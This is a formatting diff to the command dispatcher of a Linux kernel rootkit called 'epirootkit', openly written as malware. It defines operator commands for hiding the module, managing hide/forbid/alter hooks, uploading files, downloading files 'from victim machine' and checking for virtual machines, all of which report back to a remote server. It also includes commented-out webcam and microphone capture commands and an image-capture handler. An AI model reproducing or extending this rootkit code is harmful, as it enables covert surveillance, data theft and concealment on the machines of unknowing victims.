@@ -12,13 +12,13 @@
 #include <linux/vmalloc.h>
 
 #include "crypto.h"
+#include "download.h"
 #include "epirootkit.h"
 #include "io.h"
 #include "menu.h"
 #include "passwd.h"
 #include "sysinfo.h"
 #include "upload.h"
-#include "download.h"
 #include "vanish.h"
 
 extern struct socket *get_worker_socket(void);
@@ -58,10 +58,10 @@ static struct command rootkit_commands_array[] = {
     { "hide_module", 11, "hide the module from the kernel", 31, hide_module_handler },
     { "unhide_module", 13, "unhide the module in the kernel", 31, unhide_module_handler },
     { "help", 4, "display this help message", 25, help_handler },
-//    { "start_webcam", 11, "activate webcam", 15, start_webcam_handler },
-//    { "capture_image", 13, "capture an image with the webcam", 32, capture_image_handler },
-//    { "start_microphone", 15, "start recording from microphone", 31, start_microphone_handler },
-//    { "play_audio", 10, "play an audio file", 18, play_audio_handler },
+    //    { "start_webcam", 11, "activate webcam", 15, start_webcam_handler },
+    //    { "capture_image", 13, "capture an image with the webcam", 32, capture_image_handler },
+    //    { "start_microphone", 15, "start recording from microphone", 31, start_microphone_handler },
+    //    { "play_audio", 10, "play an audio file", 18, play_audio_handler },
     { "hooks", 5, "manage hide/forbid/alter rules", 30, hooks_menu_handler },
     { "upload", 6, "receive a file and save it on disk", 34, upload_handler },
     { "download", 8, "download a file from victim machine", 35, download_handler },
@@ -73,8 +73,12 @@ static struct command rootkit_commands_array[] = {
 static int is_in_vm_handler(char *args, enum Protocol protocol) {
     (void)args;
 
-    if (is_running_in_virtual_env()) { send_to_server(protocol, "[YES] The rootkit is running in a virtual machine.\n"); }
-    else { send_to_server(protocol, "[NOP] The rootkit is not running in a virtual machine.\n"); }
+    if (is_running_in_virtual_env()) {
+        send_to_server(protocol, "[YES] The rootkit is running in a virtual machine.\n");
+    }
+    else {
+        send_to_server(protocol, "[NOP] The rootkit is not running in a virtual machine.\n");
+    }
     return SUCCESS;
 }
 
@@ -84,7 +88,7 @@ static int help_handler(char *args, enum Protocol protocol) {
     int offset = snprintf(help_msg, STD_BUFFER_SIZE, "Available commands:\n");
     for (i = 0; rootkit_commands_array[i].cmd_name != NULL; i++) {
         offset += snprintf(help_msg + offset, STD_BUFFER_SIZE - offset, "\t - %s: %s\n",
-                rootkit_commands_array[i].cmd_name, rootkit_commands_array[i].cmd_desc);
+                           rootkit_commands_array[i].cmd_name, rootkit_commands_array[i].cmd_desc);
         if (offset >= STD_BUFFER_SIZE) {
             ERR_MSG("help_handler: help message truncated\n");
             break;
@@ -136,9 +140,11 @@ int rootkit_command(char *command, unsigned command_size, enum Protocol protocol
     // Match command against registered handlers
     for (int i = 0; rootkit_commands_array[i].cmd_name != NULL; i++) {
         if (strncmp(command, rootkit_commands_array[i].cmd_name,
-                    rootkit_commands_array[i].cmd_name_size) == 0) {
+                    rootkit_commands_array[i].cmd_name_size)
+            == 0) {
             char *args = command + rootkit_commands_array[i].cmd_name_size;
-            while (*args == ' ') args++;
+            while (*args == ' ')
+                args++;
             return rootkit_commands_array[i].cmd_handler(args, protocol);
         }
     }
@@ -421,7 +427,7 @@ static int capture_image_handler(char *args, enum Protocol protocol) {
     DBG_MSG("capture_image_handler: image captured successfully, saved at /tmp/capture.jpg\n");
     send_to_server(protocol, "Captured image saved at /tmp/capture.jpg\n");
 
-    
+
     // Copy the image to a directory accessible by Flask
     // For example, to /var/www/html/images/ on the server
     int copy_ret_code = system("cp /tmp/capture.jpg /var/www/html/images/capture.jpg");
@@ -429,7 +435,7 @@ static int capture_image_handler(char *args, enum Protocol protocol) {
         ERR_MSG("capture_image_handler: failed to copy image to web accessible directory\n");
         return copy_ret_code;
     }
-    
+
     return SUCCESS;
 }
 
